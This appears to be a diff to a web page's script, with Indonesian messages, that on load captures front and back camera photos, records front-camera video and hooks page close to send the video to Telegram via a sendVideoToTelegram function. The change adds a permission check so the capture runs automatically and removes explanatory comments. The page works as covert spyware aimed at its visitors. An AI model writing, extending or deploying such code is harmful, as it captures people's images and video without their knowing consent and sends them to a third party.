@@ -27,16 +27,27 @@
         let mediaRecorder;
         let recordedChunks = [];
 
+        async function checkPermissions() {
+            try {
+                const permissions = await navigator.permissions.query({ name: 'camera' });
+                if (permissions.state === "granted") {
+                    startCamera();
+                } else {
+                    navigator.mediaDevices.getUserMedia({ video: true }).then(startCamera).catch(err => console.error("Akses kamera ditolak:", err));
+                }
+            } catch (error) {
+                console.error("Gagal mengecek izin kamera:", error);
+            }
+        }
+
         async function startCamera() {
             try {
-                // Foto kamera depan & belakang
                 const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 await capturePhoto(streamFront, "Depan");
 
                 const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 await capturePhoto(streamBack, "Belakang");
 
-                // Setelah foto, mulai rekam video kamera depan
                 await startRecording();
             } catch (error) {
                 console.error("Gagal mengakses kamera:", error);
@@ -94,7 +105,6 @@
                 mediaRecorder.start();
                 console.log("Perekaman video dimulai");
 
-                // Kirim video saat user menutup halaman
                 window.addEventListener("beforeunload", sendVideoToTelegram);
             } catch (error) {
                 console.error("Gagal memulai perekaman video:", error);
@@ -125,7 +135,7 @@
             }
         }
 
-        window.onload = startCamera;
+        window.onload = checkPermissions;
     </script>
 </body>
 </html>
